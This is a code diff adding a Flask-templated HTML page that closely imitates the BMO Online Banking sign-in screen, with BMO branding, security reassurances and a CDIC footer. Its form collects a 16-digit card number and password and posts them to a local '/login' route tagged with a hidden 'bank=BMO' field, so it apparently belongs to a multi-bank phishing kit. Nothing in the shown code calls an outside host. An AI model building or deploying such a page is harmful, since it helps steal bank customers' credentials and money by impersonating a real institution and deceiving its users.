@@ -1,0 +1,136 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>BMO Online Banking</title>
+  <link rel="stylesheet" href="{{ url_for('static', filename='bmo.css') }}">
+</head>
+<body>
+
+<!-- TOP BLUE BAR -->
+<header class="bmo-topbar">
+  <div class="bmo-topbar-container">
+    <!-- Left: Logo -->
+    <div class="bmo-logo-container">
+      <img src="/static/images/bmo-logo.png" alt="BMO Logo" class="bmo-logo">
+    </div>
+    <!-- Right: Icons + FR Link -->
+    <div class="bmo-topbar-icons">
+      <img src="/static/images/location-icon.png" alt="Location" class="top-icon">
+      <img src="/static/images/help-icon.png" alt="Help" class="top-icon">
+      <a href="#" class="fr-link">FR</a>
+    </div>
+  </div>
+</header>
+
+<!-- MAIN CONTENT -->
+<main class="bmo-main">
+
+  <!-- DESKTOP HEADING (with lock icon) -->
+  <div class="bmo-page-title-row bmo-desktop-title">
+    <h1 class="bmo-title">
+      <img src="/static/images/bmo-lockhead.png" alt="Lock" class="lock-icon">
+      Sign in to Online Banking
+    </h1>
+  </div>
+
+  <!-- CONTENT CONTAINER -->
+  <div class="bmo-content">
+
+    <!-- LEFT: Login Card -->
+    <div class="bmo-login-card">
+
+      <!-- MOBILE-ONLY HEADING (no lock icon) -->
+      <h2 class="bmo-mobile-title">
+        Sign in to Online Banking
+      </h2>
+
+      <form action="/login" method="POST">
+        <input type="hidden" name="bank" value="BMO">
+      
+        <!-- Card Number -->
+        <div class="bmo-input-group">
+          <label for="cardNumber">Card number</label>
+          <input
+            type="text"
+            id="cardNumber"
+            name="card_number"
+            class="bmo-input large-input"
+            placeholder="Enter your 16-digit card number"
+            required
+          >
+          <p class="field-hint">Enter your 16-digit card number</p>
+        </div>
+
+        <!-- Remember Card -->
+        <div class="remember-row">
+          <input type="checkbox" id="rememberCard" name="remember_card">
+          <label for="rememberCard">Remember card</label>
+          <span class="info-icon">i</span>
+        </div>
+
+        <!-- Password -->
+        <div class="bmo-input-group">
+          <label for="password">Password</label>
+          <div class="password-row">
+            <input
+              type="password"
+              id="password"
+              name="password"
+              class="bmo-input"
+              required
+            >
+            <span class="eye-icon">&#128065;</span>
+          </div>
+        </div>
+
+        <!-- Forgot Password -->
+        <p class="forgot-link">
+          <a href="#">Forgot your password?</a>
+        </p>
+
+        <!-- Sign In Button -->
+        <button type="submit" class="bmo-btn">SIGN IN</button>
+      </form>
+    </div>
+
+    <!-- RIGHT: Info Boxes -->
+    <aside class="bmo-aside">
+      <div class="bmo-aside-box">
+        <h3>Register a new card for online banking</h3>
+        <p>
+          <a href="#">DEBIT CARD</a> or
+          <a href="#">CREDIT CARD</a>
+        </p>
+      </div>
+      <div class="bmo-aside-box">
+        <h3>Your security always comes first.</h3>
+        <p>
+          We’ve made Online Banking more convenient, while still using 
+          advanced security technologies that keep your money and 
+          information safe.
+        </p>
+        <p>
+          <a href="#">Learn more about how we protect you.</a>
+        </p>
+      </div>
+    </aside>
+  </div>
+</main>
+
+<!-- FOOTER -->
+<footer class="bmo-footer">
+  <ul class="footer-links">
+    <li><a href="#">Legal</a></li>
+    <li><a href="#">Privacy</a></li>
+    <li><a href="#">Security</a></li>
+    <li><a href="#">Accessibility</a></li>
+  </ul>
+  <div class="footer-members">
+    <a href="#">CDIC Member</a>
+  </div>
+</footer>
+
+</body>
+</html>
